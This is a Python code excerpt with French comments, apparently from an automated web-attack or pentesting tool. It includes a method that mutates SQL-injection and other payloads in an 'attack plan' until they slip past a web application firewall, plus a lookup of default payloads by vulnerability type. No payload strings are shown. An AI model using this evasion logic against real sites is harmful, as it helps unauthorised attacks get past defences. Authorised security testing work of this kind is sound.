    def _apply_waf_evasion(self, plan: AttackPlan) -> AttackPlan:
        """
        Applique l'évasion WAF aux payloads du plan.
        
        Teste chaque payload contre le WAFChecker et:
        - Garde les payloads non-bloqués
        - Mute les payloads bloqués
        - Supprime les payloads qui ne peuvent pas être mutés
        
        Args:
            plan: Le plan d'attaque avec payloads
            
        Returns:
            Plan avec payloads filtrés/mutés
        """
        if not self.mutator:
            return plan
        
        vuln_type = plan.vuln_class.lower() if plan.vuln_class else "sqli"
        safe_payloads = []
        mutated_count = 0
        blocked_count = 0
        
        for variant in plan.payloads:
            # Vérifier si bloqué
            result = self.mutator.auto_evade(variant.payload, vuln_type, max_depth=2)
            
            if not result.all_blocked:
                if result.best_mutation and result.best_mutation.evades:
                    # Payload muté
                    safe_payloads.append(PayloadVariant(
                        payload=result.best_mutation.mutated,
                        encoding=variant.encoding,
                        evasion=result.best_mutation.transform
                    ))
                    mutated_count += 1
                    logger.debug(f"🛡️ Mutated: {variant.payload[:30]} → {result.best_mutation.mutated[:30]}")
                else:
                    # Payload original OK
                    safe_payloads.append(variant)
            else:
                blocked_count += 1
                logger.debug(f"🚫 Blocked (no evasion found): {variant.payload[:30]}")
        
        if mutated_count > 0 or blocked_count > 0:
            logger.info(f"🛡️ WAF Evasion: {len(safe_payloads)} safe, {mutated_count} mutated, {blocked_count} blocked")
            plan.evasion_techniques.append(f"waf_evasion:{mutated_count}_mutations")
        
        plan.payloads = safe_payloads
        return plan
    
    def get_quick_payloads(self, vuln_type: str) -> List[PayloadVariant]:
        """Retourne des payloads rapides pour un type de vuln."""
        # Cherche d'abord exact, puis upper
        default = self.DEFAULT_PAYLOADS.get(vuln_type)
        if not default:
            default = self.DEFAULT_PAYLOADS.get(vuln_type.upper(), self.DEFAULT_PAYLOADS["IDOR"])
        return [
            PayloadVariant(payload=p["payload"], encoding=p.get("encoding", "none"))
            for p in default
        ]
